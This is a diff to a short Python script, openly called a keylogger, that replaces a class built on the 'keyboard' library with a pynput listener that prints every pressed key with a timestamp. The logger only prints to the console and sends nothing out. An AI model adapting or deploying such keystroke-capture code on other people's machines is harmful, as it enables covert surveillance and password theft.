@@ -1,17 +1,18 @@
-import keyboard # for keylogs
+from pynput import keyboard
 from datetime import datetime
-class Keylogger:
-    def __init__(self):
-        self.log = ""
-        self.start_dt = datetime.now()
-        self.end_dt = datetime.now()
-    def callback(self, event):
-        name = event.name
-        print(f"{datetime.now()} - {name}")
-    def start(self):
-        self.start_dt = datetime.now()
-        keyboard.on_release(callback=self.callback)
-        print(f"{datetime.now()} - Started keylogger")
-        keyboard.wait()
-keylogger = Keylogger()
-keylogger.start()
+print(f"{datetime.now()} - Started keylogger")
+def on_press(key):
+    try:
+        print(f'{datetime.now()} alphanumeric key {key.char} pressed')
+    except AttributeError:
+        print(f'{datetime.now()} special key {key} pressed')
+
+# Collect events until released
+with keyboard.Listener(
+        on_press=on_press) as listener:
+    listener.join()
+
+# ...or, in a non-blocking fashion:
+listener = keyboard.Listener(
+    on_press=on_press)
+listener.start()
